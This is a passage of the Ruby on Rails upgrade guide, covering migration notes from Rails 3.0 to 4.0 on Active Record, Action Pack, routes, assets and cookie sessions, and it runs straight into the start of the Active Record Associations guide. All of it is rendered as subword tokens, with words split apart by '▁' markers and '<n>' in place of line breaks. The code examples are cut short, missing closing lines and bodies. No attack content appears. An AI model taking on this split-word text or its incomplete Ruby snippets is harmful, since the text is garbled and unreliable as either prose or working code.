▁# ▁in ▁your ▁controller
▁format . json ▁do
▁# ▁perform ▁a ▁partial ▁update
▁@ article . update ▁params [: article ]
▁format . json _ patch ▁do
▁# ▁perform ▁sophisticat ed ▁change
▁# ▁In ▁config / initializers / json _ patch . rb :
▁M i me :: Type . register ▁' application / json - patch + json ' , ▁: json _ patch
▁As ▁JSON ▁P at ch ▁was ▁only ▁ recent ly ▁made ▁into ▁an ▁R F C , ▁there ▁are n ' t ▁a ▁lot ▁of ▁great < n > Ruby ▁libraries ▁yet .
▁A ar on ▁P at ter s on ' s < n >[ ha n a ]( https :// github . com / t end er lo ve / ha n a ) ▁is ▁one ▁such ▁gem , ▁but ▁does n ' t ▁have < n > full ▁support ▁for ▁the ▁last ▁few ▁changes ▁in ▁the ▁specific ation .
▁### ▁Gemfile
▁Rails ▁4.0 ▁removed ▁the ▁` assets ` ▁group ▁from ▁Gemfile .
▁You ' d ▁need ▁to ▁remove ▁that < n > line ▁from ▁your ▁Gemfile ▁when ▁upgrading .
▁You ▁should ▁also ▁update ▁your ▁application < n > file ▁( in ▁` config / application . rb `) :
▁# ▁ Requir e ▁the ▁gems ▁list ed ▁in ▁Gemfile , ▁including ▁any ▁gems
▁# ▁you ' ve ▁ limited ▁to ▁: test , ▁: development , ▁or ▁: production .
▁### ▁ vendor / plugin s
▁Rails ▁4.0 ▁no ▁longer ▁supports ▁load ing ▁plugin s ▁from ▁` vendor / plugin s `.
▁If ▁you ▁choose ▁not ▁to ▁make ▁them ▁gems , ▁you ▁can ▁move ▁them ▁into , ▁say , ▁` lib / my _ plugin / * ` ▁and ▁add ▁an ▁appropriate ▁initializer ▁in ▁` config / initializers / my _ plugin . rb `.
▁### ▁Active ▁Record
▁* ▁Rails ▁4.0 ▁has ▁removed ▁the ▁identity ▁map ▁from ▁Active ▁Record , ▁due ▁to ▁[ some ▁in co n s ist en c ies ▁with ▁associations ]( https :// github . com / rails / rails / commit / 3 02 c 9 12 b f 6 b cd 0 fa 200 d 9 64 ec 2 d c 4 a 44 a be 3 28 a 6 ). ▁If ▁you ▁have ▁manually ▁enabled ▁it ▁in ▁your ▁application , ▁you ▁will ▁have ▁to ▁remove ▁the ▁following ▁config ▁that ▁has ▁no ▁effect ▁any more : ▁` config . active _ record . id ent ity _ map `.
▁* ▁The ▁` delete ` ▁method ▁in ▁collection ▁associations ▁can ▁now ▁receive ▁` F i x n um ` ▁or ▁` String ` ▁arguments ▁as ▁record ▁id s , ▁be side s ▁records , ▁ pretty ▁much ▁like ▁the ▁` destroy ` ▁method ▁does .
▁P re v ious ly ▁it ▁raised ▁` ActiveRecord :: As so ci ation Type M is match ` ▁for ▁such ▁arguments .
▁ From ▁Rails ▁4.0 ▁on ▁` delete ` ▁automatically ▁ tries ▁to ▁find ▁the ▁records ▁matching ▁the ▁given ▁id s ▁before ▁deleting ▁them .
▁* ▁In ▁Rails ▁4.0 ▁when ▁a ▁column ▁or ▁a ▁table ▁is ▁re name d ▁the ▁related ▁index es ▁are ▁also ▁re name d .
▁If ▁you ▁have ▁migrations ▁which ▁re name ▁the ▁index es , ▁they ▁are ▁no ▁longer ▁needed .
▁* ▁Rails ▁4.0 ▁has ▁changed ▁` serialize d _ attributes ` ▁and ▁` attr _ readonly ` ▁to ▁class ▁methods ▁only .
▁You ▁should n ' t ▁use ▁instance ▁methods ▁since ▁it ' s ▁now ▁deprecated .
▁You ▁should ▁change ▁them ▁to ▁use ▁class ▁methods , ▁e . g . ▁` self . serialize d _ attributes ` ▁to ▁` self . class . serialize d _ attributes `.
▁* ▁Rails ▁4.0 ▁has ▁removed ▁` attr _ accessible ` ▁and ▁` attr _ protected ` ▁feature ▁in ▁favor ▁of ▁S tr on g ▁P ar am et ers .
▁You ▁can ▁use ▁the ▁[ Pro t ec t ed ▁Attributes ▁gem ]( https :// github . com / rails / protected _ attributes ) ▁for ▁a ▁ s m oo th ▁upgrade ▁path .
▁* ▁If ▁you ▁are ▁not ▁using ▁ Pro t ec t ed ▁Attributes , ▁you ▁can ▁remove ▁any ▁options ▁related ▁to < n > this ▁gem ▁such ▁as ▁` white list _ attributes ` ▁or ▁` mass _ assignment _ sanitize r ` ▁options .
▁* ▁Rails ▁4.0 ▁requires ▁that ▁scope s ▁use ▁a ▁call able ▁object ▁such ▁as ▁a ▁ Proc ▁or ▁ lambda :
▁scope ▁: active , ▁where ( active : ▁true )
▁# ▁becomes
▁scope ▁: active , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁* ▁Rails ▁4.0 ▁has ▁deprecated ▁` ActiveRecord :: F i x t ure s ` ▁in ▁favor ▁of ▁` ActiveRecord :: F i x t ure S et `.
▁* ▁Rails ▁4.0 ▁has ▁deprecated ▁` ActiveRecord :: TestCase ` ▁in ▁favor ▁of ▁` ActiveSupport :: TestCase `.
▁* ▁Rails ▁4.0 ▁has ▁deprecated ▁the ▁old - style ▁hash ▁base d ▁finder ▁API . ▁This ▁means ▁that < n > ▁methods ▁which ▁previous ly ▁accepted ▁" find er ▁options " ▁no ▁longer ▁do .
▁For ▁example , ▁` Book . find (: all , ▁conditions : ▁ { ▁name : ▁' 19 8 4 ' ▁ }) ` ▁has ▁been ▁deprecated ▁in ▁favor ▁of ▁` Book . where ( name : ▁' 19 8 4 ') `
▁* ▁All ▁dynamic ▁methods ▁except ▁for ▁` find _ by _ . . . ` ▁and ▁` find _ by _ . . . !` ▁are ▁deprecated .
▁Here ' s ▁how ▁you ▁can ▁handle ▁the ▁changes :
▁* ▁` find _ all _ by _ . . . ` ▁becomes ▁` where (...)
▁* ▁` find _ last _ by _ . . . ` ▁becomes ▁` where (...) . last `.
▁* ▁` scope d _ by _ . . . ` ▁becomes ▁` where (...)
▁* ▁` find _ or _ initialize _ by _ . . . ` ▁becomes ▁` find _ or _ initialize _ by (...) `.
▁* ▁` find _ or _ create _ by _ . . . ` ▁becomes ▁` find _ or _ create _ by (...) `.
▁* ▁Note ▁that ▁` where (...) ` ▁returns ▁a ▁relation , ▁not ▁an ▁array ▁like ▁the ▁old ▁finder s .
▁If ▁you ▁require ▁an ▁` Array `, ▁use ▁` where (...) . to _ a `.
▁* ▁These ▁equivalent ▁methods ▁may ▁not ▁execute ▁the ▁same ▁SQL ▁as ▁the ▁previous ▁implementation .
▁* ▁To ▁re - en able ▁the ▁old ▁finder s , ▁you ▁can ▁use ▁the ▁[ active record - de pre cat ed _ find ers ▁gem ]( https :// github . com / rails / active record - de pre cat ed _ find ers ).
▁### ▁Active ▁Resource
▁Rails ▁4.0 ▁extract ed ▁Active ▁Resource ▁to ▁its ▁own ▁gem .
▁If ▁you ▁ still ▁need ▁the ▁feature ▁you ▁can ▁add ▁the ▁[ Active ▁Resource ▁gem ]( https :// github . com / rails / active resource ) ▁in ▁your ▁Gemfile .
▁### ▁Active ▁Model
▁* ▁Rails ▁4.0 ▁has ▁changed ▁how ▁errors ▁attach ▁with ▁the ▁` ActiveModel :: Validations :: Co n fi rm ation Validator `.
▁Now ▁when ▁confirmation ▁validations ▁fail , ▁the ▁error ▁will ▁be ▁attach ed ▁to ▁`: # { attribute } _ confirmation ` ▁instead ▁of ▁` attribute `.
▁* ▁Rails ▁4.0 ▁has ▁changed ▁` ActiveModel :: Seri al ize r s :: JSON . include _ root _ in _ json ` ▁default ▁value ▁to ▁` false `.
▁Now , ▁Active ▁Model ▁ Seri al ize r s ▁and ▁Active ▁Record ▁objects ▁have ▁the ▁same ▁default ▁behavior .
▁This ▁means ▁that ▁you ▁can ▁comment ▁or ▁remove ▁the ▁following ▁option ▁in ▁the ▁` config / initializers / wrap _ parameters . rb ` ▁file :
▁# ▁D is able ▁root ▁element ▁in ▁JSON ▁by ▁default .
▁# ▁ ActiveSupport . on _ load (: active _ record ) ▁do
▁self . include _ root _ in _ json ▁= ▁false
▁# ▁end
▁### ▁Action ▁Pack
▁* ▁Rails ▁4.0 ▁introduce s ▁` ActiveSupport :: K e y G en er at or ` ▁and ▁uses ▁this ▁as ▁a ▁base ▁from ▁which ▁to ▁generate ▁and ▁verify ▁signed ▁cookies ▁( a mong ▁other ▁things ).
▁ Ex ist ing ▁signed ▁cookies ▁generated ▁with ▁Rails ▁3 . x ▁will ▁be ▁tr an s parent ly ▁upgrade d ▁if ▁you ▁leave ▁your ▁existing ▁` secret _ token ` ▁in ▁place ▁and ▁add ▁the ▁new ▁` secret _ key _ base `.
▁# ▁config / initializers / secret _ token . rb
▁My app :: Application . config . secret _ token ▁= ▁' ex ist ing ▁secret ▁token '
▁My app :: Application . config . secret _ key _ base ▁= ▁' new ▁secret ▁key ▁base '
▁P lease ▁note ▁that ▁you ▁should ▁wait ▁to ▁set ▁` secret _ key _ base ` ▁un til ▁you ▁have ▁100 % ▁of ▁your ▁user base ▁on ▁Rails ▁4 . x ▁and ▁are ▁reasonabl y ▁sure ▁you ▁will ▁not ▁need ▁to ▁ rollback ▁to ▁Rails ▁3 . x .
▁This ▁is ▁because ▁cookies ▁signed ▁base d ▁on ▁the ▁new ▁` secret _ key _ base ` ▁in ▁Rails ▁4 . x ▁are ▁not ▁back w ar d s ▁compatib le ▁with ▁Rails ▁3 . x .
▁You ▁are ▁free ▁to ▁leave ▁your ▁existing ▁` secret _ token ` ▁in ▁place , ▁not ▁set ▁the ▁new ▁` secret _ key _ base `, ▁and ▁ignore ▁the ▁deprecation ▁warning s ▁un til ▁you ▁are ▁reasonabl y ▁sure ▁that ▁your ▁upgrade ▁is ▁otherwise ▁complete .
▁If ▁you ▁are ▁rely ing ▁on ▁the ▁ability ▁for ▁external ▁applications ▁or ▁Java script ▁to ▁be ▁able ▁to ▁read ▁your ▁Rails ▁app ' s ▁signed ▁session ▁cookies ▁( or ▁signed ▁cookies ▁in ▁general ) ▁you ▁should ▁not ▁set ▁` secret _ key _ base ` ▁un til ▁you ▁have ▁ de co up l ed ▁these ▁concern s .
▁* ▁Rails ▁4.0 ▁encrypt s ▁the ▁contents ▁of ▁cookie - base d ▁sessions ▁if ▁` secret _ key _ base ` ▁has ▁been ▁set .
▁Rails ▁3 . x ▁signed , ▁but ▁did ▁not ▁encrypt , ▁the ▁contents ▁of ▁cookie - base d ▁session .
▁ Sign ed ▁cookies ▁are ▁" secure " ▁in ▁that ▁they ▁are ▁verifie d ▁to ▁have ▁been ▁generated ▁by ▁your ▁app ▁and ▁are ▁tamper - proof .
▁However , ▁the ▁contents ▁can ▁be ▁view ed ▁by ▁end ▁users , ▁and ▁encrypt ing ▁the ▁contents ▁eliminate s ▁this ▁caveat / co n c er n ▁without ▁a ▁significant ▁performance ▁p en alt y .
▁P lease ▁read ▁[ P u ll ▁ Request ▁# 99 78 ]( https :// github . com / rails / rails / pull / 99 78 ) ▁for ▁details ▁on ▁the ▁move ▁to ▁encrypted ▁session ▁cookies .
▁* ▁Rails ▁4.0 ▁removed ▁the ▁` ActionController :: Base . asset _ path ` ▁option .
▁Use ▁the ▁assets ▁pipeline ▁feature .
▁* ▁Rails ▁4.0 ▁has ▁deprecated ▁` ActionController :: Base . page _ cache _ ext en s ion ` ▁option .
▁Use ▁` ActionController :: Base . default _ static _ ext en s ion ` ▁instead .
▁* ▁Rails ▁4.0 ▁has ▁removed ▁Action ▁and ▁P age ▁caching ▁from ▁Action ▁Pack .
▁You ▁will ▁need ▁to ▁add ▁the ▁` action p ac k - action _ caching ` ▁gem ▁in ▁order ▁to ▁use ▁` cache s _ action ` ▁and ▁the ▁` action p ac k - page _ caching ` ▁to ▁use ▁` cache s _ pages ` ▁in ▁your ▁controllers .
▁* ▁Rails ▁4.0 ▁has ▁removed ▁the ▁ X ML ▁parameters ▁pars er .
▁You ▁will ▁need ▁to ▁add ▁the ▁` action p ac k - xml _ parse r ` ▁gem ▁if ▁you ▁require ▁this ▁feature .
▁* ▁Rails ▁4.0 ▁changes ▁the ▁default ▁me m cache d ▁client ▁from ▁` me m cache - client ` ▁to ▁` d all i `.
▁To ▁upgrade , ▁simply ▁add ▁` gem ▁' d all i ' ` ▁to ▁your ▁` Gemfile `.
▁* ▁Rails ▁4.0 ▁ de pre cat es ▁the ▁` do m _ id ` ▁and ▁` do m _ class ` ▁methods ▁in ▁controllers ▁( the y ▁are ▁fine ▁in ▁views ).
▁You ▁will ▁need ▁to ▁include ▁the ▁` ActionView :: Record I d ent if i er ` ▁module ▁in ▁controllers ▁requiring ▁this ▁feature .
▁* ▁Rails ▁4.0 ▁ de pre cat es ▁the ▁`: co n fi rm ` ▁option ▁for ▁the ▁` link _ to ` ▁helper .
▁You ▁should < n > instead ▁rely ▁on ▁a ▁data ▁attribute ▁( e . g . ▁` data : ▁ { ▁confirm : ▁' A re ▁you ▁sure ? ' ▁}` ).
▁This ▁deprecation ▁also ▁concern s ▁the ▁helpers ▁base d ▁on ▁this ▁one ▁( such ▁as ▁` link _ to _ if `< n > or ▁` link _ to _ unless ` ).
▁* ▁Rails ▁4.0 ▁changed ▁how ▁` assert _ generate s `, ▁` assert _ recognizes `, ▁and ▁` assert _ routing ` ▁work .
▁Now ▁all ▁these ▁assertion s ▁raise ▁` Assertion ` ▁instead ▁of ▁` ActionController :: Routing Error `.
▁* ▁Rails ▁4.0 ▁raise s ▁an ▁` ArgumentError ` ▁if ▁cl as h ing ▁named ▁routes ▁are ▁defined .
▁This ▁can ▁be ▁trigger ed ▁by ▁explicitly ▁defined ▁named ▁routes ▁or ▁by ▁the ▁` resources ` ▁method .
▁Here ▁are ▁two ▁examples ▁that ▁cl as h ▁with ▁routes ▁named ▁` example _ path ` :
▁get ▁' one ' ▁=> ▁' test # example ' , ▁as : ▁: example
▁get ▁' two ' ▁=> ▁' test # example ' , ▁as : ▁: example
▁resources ▁: example s
▁In ▁the ▁first ▁case , ▁you ▁can ▁simply ▁avoid ▁using ▁the ▁same ▁name ▁for ▁multiple < n > routes .
▁* ▁Rails ▁4.0 ▁also ▁changed ▁the ▁way ▁un i code ▁character ▁routes ▁are ▁d raw n .
▁Now ▁you ▁can ▁d raw ▁un i code ▁character ▁routes ▁directly .
▁If ▁you ▁already ▁d raw ▁such ▁routes , ▁you ▁must ▁change ▁them , ▁for ▁example :
▁get ▁Rack :: U til s . escape (' こんにちは ') , ▁controller : ▁' welcome ' , ▁action : ▁' index '
▁becomes
▁get ▁' こんにちは ' , ▁controller : ▁' welcome ' , ▁action : ▁' index '
▁* ▁Rails ▁4.0 ▁requires ▁that ▁routes ▁using ▁` match ` ▁must ▁specify ▁the ▁request ▁method .
▁# ▁Rails ▁3 . x
▁match ▁' / ' ▁=> ▁' root # index '
▁# ▁becomes
▁match ▁' / ' ▁=> ▁' root # index ' , ▁via : ▁: get
▁# ▁or
▁get ▁' / ' ▁=> ▁' root # index '
▁* ▁Rails ▁4.0 ▁has ▁removed ▁` ActionDispatch :: B est S t and ar d s S up port ` ▁middleware , ▁` < ! D O C TYPE ▁ html >` ▁already ▁trigger s ▁standard s ▁mode ▁per ▁ http :// m s d n . micro s of t . com / en - us / lib r ary / j j 6 76 9 15 ( v = v s . 8 5 ). as p x ▁and ▁Chrome Frame ▁header ▁has ▁been ▁mov ed ▁to ▁` config . action _ dispatch . default _ header s `.
▁Re member ▁you ▁must ▁also ▁remove ▁any ▁reference s ▁to ▁the ▁middleware ▁from ▁your ▁application ▁code , ▁for ▁example :
▁# ▁R a is e ▁exception
▁config . middleware . insert _ before ( Rack :: Lock , ▁ ActionDispatch :: B est S t and ar d s S up port )
▁Also ▁check ▁your ▁environment ▁settings ▁for ▁` config . action _ dispatch . b est _ standard s _ support ` ▁and ▁remove ▁it ▁if ▁present .
▁* ▁In ▁Rails ▁4.0 , ▁pre com p il ing ▁assets ▁no ▁longer ▁automatically ▁copie s ▁non - JS / CSS ▁assets ▁from ▁` vendor / assets ` ▁and ▁` lib / assets `.
▁Rails ▁application ▁and ▁engine ▁developers ▁should ▁put ▁these ▁assets ▁in ▁` app / assets ` ▁or ▁configure ▁` config . assets . precompile `.
▁* ▁In ▁Rails ▁4.0 , ▁` ActionController :: U n k now n For m at ` ▁is ▁raised ▁when ▁the ▁action ▁does n ' t ▁handle ▁the ▁request ▁format .
▁By ▁default , ▁the ▁exception ▁is ▁handle d ▁by ▁respond ing ▁with ▁4 06 ▁No t ▁A c ce p table , ▁but ▁you ▁can ▁override ▁that ▁now .
▁In ▁Rails ▁3 , ▁4 06 ▁No t ▁A c ce p table ▁was ▁always ▁returned .
▁No ▁override s .
▁* ▁In ▁Rails ▁4.0 , ▁a ▁generic ▁` ActionDispatch :: ParamsParser :: P ar se Error ` ▁exception ▁is ▁raised ▁when ▁` ParamsParser ` ▁fails ▁to ▁ parse ▁request ▁params .
▁You ▁will ▁want ▁to ▁rescue ▁this ▁exception ▁instead ▁of ▁the ▁ low - level ▁` M ul t i J s on :: D e code Error `, ▁for ▁example .
▁* ▁In ▁Rails ▁4.0 , ▁` S C R IP T _ N A ME ` ▁is ▁properly ▁nested ▁when ▁engines ▁are ▁m o un t ed ▁on ▁an ▁app ▁that ' s ▁served ▁from ▁a ▁URL ▁prefix .
▁You ▁no ▁longer ▁have ▁to ▁set ▁` default _ url _ options [: script _ name ]` ▁to ▁work ▁around ▁over written ▁URL ▁prefix es .
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: Integration ` ▁in ▁favor ▁of ▁` ActionDispatch :: Integration `.
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: Integration Test ` ▁in ▁favor ▁of ▁` ActionDispatch :: Integration Test `.
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: P er form ance Test ` ▁in ▁favor ▁of ▁` ActionDispatch :: P er form ance Test `.
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: Abstract Request ` ▁in ▁favor ▁of ▁` ActionDispatch :: Request `.
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: Request ` ▁in ▁favor ▁of ▁` ActionDispatch :: Request `.
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: Abstract Response ` ▁in ▁favor ▁of ▁` ActionDispatch :: Response `.
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: Response ` ▁in ▁favor ▁of ▁` ActionDispatch :: Response `.
▁* ▁Rails ▁4.0 ▁deprecated ▁` ActionController :: Routing ` ▁in ▁favor ▁of ▁` ActionDispatch :: Routing `.
▁### ▁Active ▁Support
▁Rails ▁4.0 ▁remove s ▁the ▁` j ` ▁alias ▁for ▁` ER B :: U til # json _ escape ` ▁since ▁` j ` ▁is ▁already ▁used ▁for ▁` ActionView :: Helpers :: JavaScript Helper # escape _ javascript `.
▁### ▁ Helpers ▁Load ing ▁ Order
▁The ▁order ▁in ▁which ▁helpers ▁from ▁more ▁than ▁one ▁directory ▁are ▁loaded ▁has ▁changed ▁in ▁Rails ▁4.0 .
▁P re v ious ly , ▁they ▁were ▁g ather ed ▁and ▁the n ▁sort ed ▁ al ph a be tic ally .
▁After ▁upgrading ▁to ▁Rails ▁4.0 , ▁helpers ▁will ▁pre serve ▁the ▁order ▁of ▁loaded ▁directories ▁and ▁will ▁be ▁sort ed ▁ al ph a be tic ally ▁only ▁within ▁each ▁directory .
▁Un less ▁you ▁explicitly ▁use ▁the ▁` helpers _ path ` ▁parameter , ▁this ▁change ▁will ▁only ▁i mpact ▁the ▁way ▁of ▁load ing ▁helpers ▁from ▁engines .
▁If ▁you ▁rely ▁on ▁the ▁order ing , ▁you ▁should ▁check ▁if ▁correct ▁methods ▁are ▁available ▁after ▁upgrade .
▁If ▁you ▁would ▁like ▁to ▁change ▁the ▁order ▁in ▁which ▁engines ▁are ▁loaded , ▁you ▁can ▁use ▁` config . ra il t ies _ order = ` ▁method .
▁### ▁Active ▁Record ▁O b server ▁and ▁Action ▁Controller ▁S w eep er
▁` ActiveRecord :: O b server ` ▁and ▁` ActionController :: Caching :: S w eep er ` ▁have ▁been ▁extract ed ▁to ▁the ▁` rails - ob server s ` ▁gem .
▁You ▁will ▁need ▁to ▁add ▁the ▁` rails - ob server s ` ▁gem ▁if ▁you ▁require ▁these ▁features .
▁### ▁ sprockets - rails
▁* ▁` assets : precompile : primary ` ▁and ▁` assets : precompile : all ` ▁have ▁been ▁removed .
▁Use ▁` assets : precompile ` ▁instead .
▁* ▁The ▁` config . assets . compress ` ▁option ▁should ▁be ▁changed ▁to ▁` config . assets . js _ compressor ` ▁like ▁so ▁for ▁instance :
▁config . assets . js _ compressor ▁= ▁: uglifier
▁### ▁ sass - rails
▁* ▁` asset - url ` ▁with ▁two ▁arguments ▁is ▁deprecated .
▁For ▁example : ▁` asset - url (" rails . png ", ▁image )` ▁becomes ▁` asset - url (" rails . png ") `.
▁U pgrading ▁from ▁Rails ▁3.1 ▁to ▁Rails ▁3.2
▁If ▁your ▁application ▁is ▁current ly ▁on ▁any ▁version ▁of ▁Rails ▁older ▁than ▁3.1 . x , ▁you < n > s h o ul d ▁upgrade ▁to ▁Rails ▁3.1 ▁before ▁attempt ing ▁an ▁update ▁to ▁Rails ▁3.2 .
▁The ▁following ▁changes ▁are ▁mean t ▁for ▁upgrading ▁your ▁application ▁to ▁the ▁latest < n > 3 . 2 . x ▁version ▁of ▁Rails .
▁ Make ▁the ▁following ▁changes ▁to ▁your ▁` Gemfile `.
▁group ▁: assets ▁do
▁gem ▁' sass - rails ' , ▁' ~ > ▁3.2 . 6 '
▁gem ▁' coffee - rails ' , ▁' ~ > ▁3.2 . 2 '
▁gem ▁' uglifier ' , ▁' > = ▁1. 0 . 3 '
▁### ▁config / environments / development . rb
▁There ▁are ▁a ▁couple ▁of ▁new ▁configuration ▁settings ▁that ▁you ▁should ▁add ▁to ▁your ▁development ▁environment :
▁# ▁R a is e ▁exception ▁on ▁ mass ▁assignment ▁protect ion ▁for ▁Active ▁Record ▁models
▁config . active _ record . mass _ assignment _ sanitize r ▁= ▁: str ic t
▁# ▁ Log ▁the ▁query ▁plan ▁for ▁queries ▁tak ing ▁more ▁than ▁this ▁( work s
▁# ▁with ▁SQLite , ▁MySQL , ▁and ▁PostgreSQL )
▁config . active _ record . auto _ explain _ th re s h ol d _ in _ second s ▁= ▁0 . 5
▁### ▁config / environments / test . rb
▁The ▁` mass _ assignment _ sanitize r ` ▁configuration ▁setting ▁should ▁also ▁be ▁be ▁added ▁to ▁` config / environments / test . rb ` :
▁Rails ▁3.2 ▁ de pre cat es ▁` vendor / plugin s ` ▁and ▁Rails ▁4.0 ▁will ▁remove ▁them ▁completely .
▁Whi le ▁it ' s ▁not ▁ str ic t ly ▁necessary ▁as ▁part ▁of ▁a ▁Rails ▁3.2 ▁upgrade , ▁you ▁can ▁start ▁replacing ▁any ▁plugin s ▁by ▁extract ing ▁them ▁to ▁gems ▁and ▁adding ▁them ▁to ▁your ▁Gemfile .
▁Option ▁`: dependent ▁=> ▁: re str ic t ` ▁has ▁been ▁removed ▁from ▁` belongs _ to `.
▁If ▁you ▁want ▁to ▁prevent ▁deleting ▁the ▁object ▁if ▁there ▁are ▁any ▁ associated ▁objects , ▁you ▁can ▁set ▁`: dependent ▁=> ▁: destroy ` ▁and ▁return ▁` false ` ▁after ▁check ing ▁for ▁exist ence ▁of ▁association ▁from ▁any ▁of ▁the ▁ associated ▁object ' s ▁destroy ▁callbacks .
▁U pgrading ▁from ▁Rails ▁3.0 ▁to ▁Rails ▁3.1
▁If ▁your ▁application ▁is ▁current ly ▁on ▁any ▁version ▁of ▁Rails ▁older ▁than ▁3.0 . x , ▁you ▁should ▁upgrade ▁to ▁Rails ▁3.0 ▁before ▁attempt ing ▁an ▁update ▁to ▁Rails ▁3.1 .
▁The ▁following ▁changes ▁are ▁mean t ▁for ▁upgrading ▁your ▁application ▁to ▁Rails ▁3.1 . 12 , ▁the ▁last ▁3.1 . x ▁version ▁of ▁Rails .
▁gem ▁' rails ' , ▁' 3 . 1 . 12 '
▁gem ▁' mysql 2 '
▁# ▁N e ed ed ▁for ▁the ▁new ▁asset ▁pipeline
▁gem ▁' sass - rails ' , ▁' ~ > ▁3.1 . 7 '
▁gem ▁' coffee - rails ' , ▁' ~ > ▁3.1 . 1 '
▁# ▁jQuery ▁is ▁the ▁default ▁JavaScript ▁library ▁in ▁Rails ▁3.1
▁gem ▁' jquery - rails '
▁### ▁config / application . rb
▁The ▁asset ▁pipeline ▁requires ▁the ▁following ▁addition s :
▁config . assets . en able d ▁= ▁true
▁config . assets . version ▁= ▁' 1 . 0 '
▁If ▁your ▁application ▁is ▁using ▁an ▁" / assets " ▁route ▁for ▁a ▁resource ▁you ▁may ▁want ▁change ▁the ▁prefix ▁used ▁for ▁assets ▁to ▁avoid ▁conflicts :
▁# ▁Defaults ▁to ▁' / assets '
▁config . assets . prefix ▁= ▁' / asset - file s '
▁Re m o ve ▁the ▁R JS ▁setting ▁` config . action _ view . debug _ r js ▁= ▁true `.
▁Add ▁these ▁settings ▁if ▁you ▁enable ▁the ▁asset ▁pipeline :
▁# ▁Do ▁not ▁ compress ▁assets
▁config . assets . compress ▁= ▁false
▁# ▁Exp and s ▁the ▁lines ▁which ▁load ▁the ▁assets
▁config . assets . debug ▁= ▁true
▁### ▁config / environments / production . rb
▁A g a in , ▁most ▁of ▁the ▁changes ▁below ▁are ▁for ▁the ▁asset ▁pipeline .
▁You ▁can ▁read ▁more ▁about ▁these ▁in ▁the ▁[ Asset ▁Pipeline ]( asset _ pipeline . html ) ▁guide .
▁# ▁Co mp re s s ▁JavaScript s ▁and ▁CSS
▁config . assets . compress ▁= ▁true
▁# ▁Do n ' t ▁f all back ▁to ▁assets ▁pipeline ▁if ▁a ▁pre compiled ▁asset ▁is ▁m is s ed
▁config . assets . compile ▁= ▁false
▁# ▁Generate ▁digest s ▁for ▁assets ▁URLs
▁config . assets . digest ▁= ▁true
▁# ▁Defaults ▁to ▁Rails . root . join (" public / assets ")
▁# ▁config . assets . ma n if est ▁= ▁ Y O U R _ P A T H
▁# ▁P re compile ▁ additional ▁assets ▁( application . js , ▁application . css , ▁and ▁all ▁non - JS / CSS ▁are ▁already ▁added )
▁# ▁config . assets . precompile ▁ + = ▁% w ( ▁search . js ▁ )
▁# ▁For ce ▁all ▁access ▁to ▁the ▁app ▁over ▁SSL , ▁use ▁ Strict - Trans port - Security , ▁and ▁use ▁secure ▁cookies .
▁# ▁config . force _ ssl ▁= ▁true
▁You ▁can ▁help ▁test ▁performance ▁with ▁these ▁addition s ▁to ▁your ▁test ▁environment :
▁# ▁Configur e ▁static ▁asset ▁server ▁for ▁tests ▁with ▁ Cache - Control ▁for ▁performance
▁config . static _ cache _ control ▁= ▁' public , ▁ ma x - age = 36 00 '
▁### ▁config / initializers / wrap _ parameters . rb
▁Add ▁this ▁file ▁with ▁the ▁following ▁contents , ▁if ▁you ▁wish ▁to ▁wrap ▁parameters ▁into ▁a ▁nested ▁hash .
▁This ▁is ▁on ▁by ▁default ▁in ▁new ▁applications .
▁# ▁Be ▁sure ▁to ▁restart ▁your ▁server ▁when ▁you ▁modify ▁this ▁file .
▁# ▁This ▁file ▁contains ▁settings ▁for ▁ ActionController :: P ar am s W r app er ▁which
▁# ▁is ▁enabled ▁by ▁default .
▁# ▁E n able ▁parameter ▁wrapp ing ▁for ▁JSON . ▁You ▁can ▁disable ▁this ▁by ▁setting ▁: format ▁to ▁an ▁empty ▁array .
▁ ActiveSupport . on _ load (: action _ controller ) ▁do
▁wrap _ parameters ▁format : ▁[ : json ]
▁ ActiveSupport . on _ load (: active _ record ) ▁do
▁self . include _ root _ in _ json ▁= ▁false
▁### ▁config / initializers / session _ store . rb
▁You ▁need ▁to ▁change ▁your ▁session ▁key ▁to ▁something ▁new , ▁or ▁remove ▁all ▁sessions :
▁# ▁in ▁config / initializers / session _ store . rb
▁App Name :: Application . config . session _ store ▁: cookie _ store , ▁key : ▁' S O ME T H ING N E W '
▁ $ ▁bin / rake ▁db : sessions : clear
▁### ▁Re m o ve ▁: cache ▁and ▁: concat ▁options ▁in ▁asset ▁helpers ▁reference s ▁in ▁views
▁* ▁With ▁the ▁ Asset ▁Pipeline ▁the ▁: cache ▁and ▁: concat ▁options ▁are n ' t ▁used ▁any more , ▁delete ▁these ▁options ▁from ▁your ▁views .
▁Active ▁Record ▁Associations
▁This ▁guide ▁cover s ▁the ▁association ▁features ▁of ▁Active ▁Record .
▁* ▁How ▁to ▁declare ▁associations ▁between ▁Active ▁Record ▁models .
▁* ▁How ▁to ▁understand ▁the ▁ various ▁types ▁of ▁Active ▁Record ▁associations .
▁* ▁How ▁to ▁use ▁the ▁methods ▁added ▁to ▁your ▁models ▁by ▁creating ▁associations .
▁W h y ▁Associations ?
▁W h y ▁do ▁we ▁need ▁associations ▁between ▁models ?
▁Because ▁they ▁make ▁common ▁operations ▁simple r ▁and ▁easier ▁in ▁your ▁code .
▁For ▁example , ▁consider ▁a ▁simple ▁Rails ▁application ▁that ▁includes ▁a ▁model ▁for ▁customer s ▁and ▁a ▁model ▁for ▁orders .
▁ Each ▁customer ▁can ▁have ▁many ▁orders .
▁With out ▁associations , ▁the ▁model ▁declaration s ▁would ▁look ▁like ▁this :
▁class ▁C us to m er ▁< ▁ActiveRecord :: Base
▁Now , ▁suppose ▁we ▁want ed ▁to ▁add ▁a ▁new ▁order ▁for ▁an ▁existing ▁customer .
▁We ' d ▁need ▁to ▁do ▁something ▁like ▁this :
▁@ order ▁= ▁ Order . create ( order _ date : ▁Time . now , ▁customer _ id : ▁@ customer . id )
▁Or ▁consider ▁deleting ▁a ▁customer , ▁and ▁ en s ur ing ▁that ▁all ▁of ▁its ▁orders ▁get ▁deleted ▁as ▁well :
▁@ orders ▁= ▁ Order . where ( customer _ id : ▁@ customer . id )
▁@ orders . each ▁do ▁| order |
▁order . destroy
▁@ customer . destroy
